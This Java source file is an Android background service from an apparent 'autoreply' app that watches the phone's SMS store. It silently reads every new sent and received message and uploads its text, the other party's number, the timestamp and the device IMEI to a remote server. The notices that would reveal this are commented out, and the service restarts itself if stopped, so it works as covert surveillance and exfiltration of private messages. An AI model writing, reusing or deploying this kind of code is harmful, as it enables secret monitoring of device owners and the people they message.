package com.mikuwxc.autoreply.service;

import android.app.Service;
import android.content.ContentResolver;
import android.content.Context;
import android.content.Intent;
import android.database.ContentObserver;
import android.database.Cursor;
import android.net.Uri;
import android.os.Handler;
import android.os.IBinder;
import android.os.Message;
import android.widget.Toast;

import com.google.gson.Gson;
import com.lzy.okgo.OkGo;
import com.lzy.okgo.callback.StringCallback;
import com.mikuwxc.autoreply.bean.SmsObserverBean;
import com.mikuwxc.autoreply.common.MyApp;
import com.mikuwxc.autoreply.common.net.NetApi;
import com.mikuwxc.autoreply.common.util.AppConfig;
import com.mikuwxc.autoreply.utils.SystemUtil;

import okhttp3.Call;
import okhttp3.Response;


/**
 *
 * create by : 喻敏航
 * create time : 8018-10-13
 * description : 短信监听服务
 *
 * **/
public class SmsObserverService extends Service {


    private static final int SUCCESS_OK = 200;

    /**
    * 短信 url监听路径

    全部短信：content://sms/
    收件箱：content://sms/inbox
    发件箱：content://sms/sent
    草稿箱：content://sms/draft
    */

    private Uri SMS_INBOX = Uri.parse("content://sms/");
    private SmsObserver smsObserver;
    private SmsObserverBean sendBean;
    private SmsObserverBean receiverBean;
    private Handler smsHandler;

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }


    @Override
    public void onCreate() {
        super.onCreate();
           smsHandler = new Handler() {
            //这里可以进行回调的操作
            @Override
            public void handleMessage(Message msg) {
                super.handleMessage(msg);
                switch (msg.what) {
                    case 200:
                        SmsObserverBean smsObserverBean = (SmsObserverBean) msg.obj;
                        uploadSmsMessage(smsObserverBean);
                        break;
                    default:
                        break;
                }
            }
        };
        init();


    }

    private void init() {
        sendBean = new SmsObserverBean("","","",0L);
        receiverBean = new SmsObserverBean("","","",0L);
        smsObserver = new SmsObserver(this, smsHandler);
        getContentResolver().registerContentObserver(SMS_INBOX, true, smsObserver);
    }


    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        return START_STICKY;
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
    }


    class SmsObserver extends ContentObserver {

        public SmsObserver(Context context, Handler handler) {
            super(handler);
        }

        @Override
        public void onChange(boolean selfChange) {
            super.onChange(selfChange);
            //每当有新短信到来时，使用我们获取短消息的方法
            getSmsFromPhone();

        }
    }


    public void getSmsFromPhone() {
        ContentResolver cr = getContentResolver();
        String[] projection = new String[]{"body", "address", "type", "date"};
        String where = " date >  " + (System.currentTimeMillis() - 10 * 60 * 1000);
        Cursor cur = cr.query(SMS_INBOX, projection, where, null, "date desc");
        if (null == cur) return;
        if (cur.moveToFirst()) {
            String number = cur.getString(cur.getColumnIndex("address"));//手机号
            String body = cur.getString(cur.getColumnIndex("body"));
            String type = cur.getString(cur.getColumnIndex("type"));
            long date = cur.getLong(cur.getColumnIndex("date"));
            //TODO 这里是具体处理逻辑
            if ("2".equals(type)) {
                //发出的短信
                if (!sendBean.getContent().equals(body) || !sendBean.getPhoneNum().equals(number) || !sendBean.getType().equals(type) || !sendBean.getTime().equals(date)) {
                    sendBean.setContent(body);
                    sendBean.setPhoneNum(number);
                    sendBean.setType(type);
                    sendBean.setTime(date);
                    smsHandler.obtainMessage(SUCCESS_OK,sendBean);
                    Message message=new Message();
                    message.what=SUCCESS_OK;
                    message.obj=sendBean;
                    smsHandler.sendMessage(message);
                    //Toast.makeText(this, "发出短信:::::::"+number + body + type + "..." + date, Toast.LENGTH_SHORT).show();
                }

            } else if("1".equals(type)){
                //收到的短信
                if (!receiverBean.getContent().equals(body) || !receiverBean.getPhoneNum().equals(number) || !receiverBean.getType().equals(type) || !receiverBean.getTime().equals(date)) {
                    receiverBean.setContent(body);
                    receiverBean.setPhoneNum(number);
                    receiverBean.setType(type);
                    receiverBean.setTime(date);
                    Message message=new Message();
                    message.what=SUCCESS_OK;
                    message.obj=receiverBean;
                    smsHandler.sendMessage(message);
                   //Toast.makeText(this, "收到短信:::::::"+number + body + type + "..." + date, Toast.LENGTH_SHORT).show();
                }

            }

        }
    }




    private  void uploadSmsMessage(SmsObserverBean obj) {
        String url=AppConfig.OUT_NETWORK+NetApi.upload_sms_message;
        String type="2".equals(obj.getType())?"true":"false";
        SmsBean smsBean=new SmsBean(SystemUtil.getIMEI(MyApp.getAppContext()),obj.getContent(),type,obj.getPhoneNum(),String.valueOf(obj.getTime()));
        OkGo.<String>post(url)
                .tag(this)
                .upJson(new Gson().toJson(smsBean))
                .execute(new StringCallback() {
                    @Override
                    public void onSuccess(String s, Call call, Response response) {

                        SmsSuccessBean smsSuccessBean = new Gson().fromJson(s, SmsSuccessBean.class);
                        if("200".equals(smsSuccessBean.getCode())){
                            //上传成功
                            //Toast.makeText(SmsObserverService.this, "短信上传成功", Toast.LENGTH_SHORT).show();
                        }
                    }

                    @Override
                    public void onError(Call call, Response response, Exception e) {
                        super.onError(call, response, e);
                    }
                });
    }


    class SmsBean{
        private String imei;
        private String content;
        private String type;
        private String phone;
        private String time;

        public SmsBean(String imei, String content, String type, String phone, String time) {
            this.imei = imei;
            this.content = content;
            this.type = type;
            this.phone = phone;
            this.time = time;
        }

        public String getImei() {
            return imei;
        }

        public void setImei(String imei) {
            this.imei = imei;
        }

        public String getContent() {
            return content;
        }

        public void setContent(String content) {
            this.content = content;
        }

        public String getType() {
            return type;
        }

        public void setType(String type) {
            this.type = type;
        }

        public String getPhone() {
            return phone;
        }

        public void setPhone(String phone) {
            this.phone = phone;
        }

        public String getTime() {
            return time;
        }

        public void setTime(String time) {
            this.time = time;
        }
    }


    class SmsSuccessBean{

        /**
         * msg : 添加成功
         * code : 200
         * success : true
         */

        private String msg;
        private String code;
        private boolean success;

        public String getMsg() {
            return msg;
        }

        public void setMsg(String msg) {
            this.msg = msg;
        }

        public String getCode() {
            return code;
        }

        public void setCode(String code) {
            this.code = code;
        }

        public boolean isSuccess() {
            return success;
        }

        public void setSuccess(boolean success) {
            this.success = success;
        }
    }
}
